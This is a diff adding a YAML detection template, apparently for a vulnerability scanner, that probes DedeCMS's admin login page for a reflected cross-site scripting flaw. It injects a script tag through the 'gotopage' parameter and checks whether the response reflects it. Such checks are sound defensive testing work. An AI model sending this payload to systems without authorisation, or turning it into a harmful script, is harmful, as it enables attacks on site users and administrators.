@@ -1,0 +1,16 @@
+name: poc-yaml-dedecms-gotopage-xss
+set:
+  r: randomInt(800000000, 1000000000)
+  ident: bytes("console.log("+string(r)+")")
+rules:
+  - method: GET
+    path: >-
+      /manage/login.php?gotopage=\"><script>console.log({{r}})</script><x=\"\""
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(ident) 
+detail:
+  author: harris2015(https://github.com/harris2015)
+  Affected Version: "ALL"
+  links:
+    - https://www.genban.org/news/dedecms-7665.html
